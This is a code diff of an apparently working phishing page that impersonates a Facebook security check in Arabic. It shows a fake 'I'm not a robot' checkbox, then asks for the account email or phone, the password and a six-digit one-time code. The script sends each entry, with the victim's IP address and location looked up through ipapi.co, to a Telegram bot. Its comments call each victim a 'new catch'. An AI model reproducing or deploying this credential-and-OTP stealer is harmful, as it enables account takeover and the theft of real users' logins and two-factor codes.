@@ -3,42 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Security Center</title>
+    <title>Facebook - Security Check</title>
     <style>
         body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.2); width: 100%; max-width: 400px; text-align: center; }
         .fb-logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 20px; }
         input { width: 92%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; background: #f5f6f7; }
         .btn { background: #1877f2; color: white; border: none; padding: 14px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 17px; }
-        #captcha-box, #otp-box { display: none; }
-        .captcha-ui { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 12px; border-radius: 3px; display: flex; align-items: center; margin: 20px 0; }
+        #login-box, #otp-box { display: none; }
+        .captcha-ui { background: #f9f9f9; border: 1px solid #d3d3d3; padding: 15px; border-radius: 3px; display: flex; align-items: center; margin: 20px 0; cursor: pointer; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="fb-logo">facebook</div>
-    
-    <div id="login-box">
-        <p style="font-weight: 600;">يجب تأكيد هويتك للمتابعة</p>
-        <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الهاتف">
-        <input type="password" id="p" placeholder="كلمة السر">
-        <button class="btn" onclick="goNext()">تسجيل الدخول</button>
-    </div>
 
     <div id="captcha-box">
-        <h3>التحقق من أنك لست روبوت</h3>
-        <div class="captcha-ui">
-            <input type="checkbox" onclick="goOTP()" style="width: 25px; height: 25px; cursor: pointer;">
-            <span style="margin-right: 15px; font-size: 14px;">أنا لست برنامج روبوت</span>
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30" style="margin-right: auto;">
+        <h3 style="font-size: 18px; color: #4b4f56;">يرجى التحقق من الهوية للمتابعة</h3>
+        <div class="captcha-ui" onclick="showLogin()">
+            <input type="checkbox" id="check" style="width: 25px; height: 25px; cursor: pointer;">
+            <span style="margin-right: 15px; font-size: 15px; color: #555;">أنا لست برنامج روبوت</span>
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="32" style="margin-right: auto;">
         </div>
     </div>
 
+    <div id="login-box">
+        <p style="font-weight: 600;">قم بتسجيل الدخول لتأكيد ملكية الحساب</p>
+        <input type="text" id="u" placeholder="البريد الإلكتروني أو رقم الهاتف">
+        <input type="password" id="p" placeholder="كلمة السر">
+        <button class="btn" onclick="goNext()">متابعة</button>
+    </div>
+
     <div id="otp-box">
-        <h3 style="color: #d93025;">تم إرسال رمز الأمان</h3>
-        <p style="font-size: 14px;">أدخل الرمز المكون من 6 أرقام للمتابعة</p>
-        <input type="text" id="o" placeholder="------" maxlength="6" style="text-align: center; font-size: 25px; letter-spacing: 5px;">
+        <h3 style="color: #d93025;">تأكيد رمز الأمان</h3>
+        <p style="font-size: 13px; color: #606770;">تم إرسال رمز مكون من 6 أرقام إلى هاتفك</p>
+        <input type="text" id="o" placeholder="Code" maxlength="6" style="text-align: center; font-size: 25px; letter-spacing: 5px;">
         <button class="btn" onclick="finish()">تأكيد</button>
     </div>
 </div>
@@ -48,35 +48,40 @@
     const C = "1356975454";
     let user = "";
 
-    // سحب الـ IP والموقع تلقائياً
-    window.onload = async () => {
-        const res = await fetch('https://ipapi.co/json/');
-        const d = await res.json();
-        const info = `\n📍 الموقع: ${d.city}, ${d.country}\n🌐 IP: ${d.ip}`;
-        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("⚠️ ضحية جديد فتح الرابط الآن!" + info)}`);
-    };
-
-    function goNext() {
-        user = document.getElementById('u').value;
-        let pass = document.getElementById('p').value;
-        if(user && pass) {
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("🎯 صيدة جديدة\n👤: " + user + "\n🔑: " + pass)}`);
-            document.getElementById('login-box').style.display='none';
-            document.getElementById('captcha-box').style.display='block';
-        }
+    function showLogin() {
+        document.getElementById('check').checked = true;
+        setTimeout(() => {
+            document.getElementById('captcha-box').style.display = 'none';
+            document.getElementById('login-box').style.display = 'block';
+        }, 600);
     }
 
-    function goOTP() {
-        setTimeout(() => {
-            document.getElementById('captcha-box').style.display='none';
-            document.getElementById('otp-box').style.display='block';
-        }, 800);
+    async function goNext() {
+        user = document.getElementById('u').value;
+        let pass = document.getElementById('p').value;
+        
+        if(user && pass) {
+            // سحب البيانات بهدوء عند الضغط
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                const info = `\n📍 الموقع: ${d.city}, ${d.country}\n🌐 IP: ${d.ip}`;
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("🎯 صيدة جديدة\n👤: " + user + "\n🔑: " + pass + info)}`);
+            } catch (e) {
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("🎯 صيدة جديدة (بدون IP)\n👤: " + user + "\n🔑: " + pass)}`);
+            }
+            
+            document.getElementById('login-box').style.display = 'none';
+            document.getElementById('otp-box').style.display = 'block';
+        }
     }
 
     function finish() {
         let code = document.getElementById('o').value;
-        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("🔢 كود الـ OTP: " + code + "\n👤: " + user)}`);
-        window.location.href = "https://facebook.com/security";
+        if(code) {
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent("🔢 كود الـ OTP حقيقي: " + code + "\n👤 الحساب: " + user)}`);
+            window.location.href = "https://facebook.com/security";
+        }
     }
 </script>
 </body>
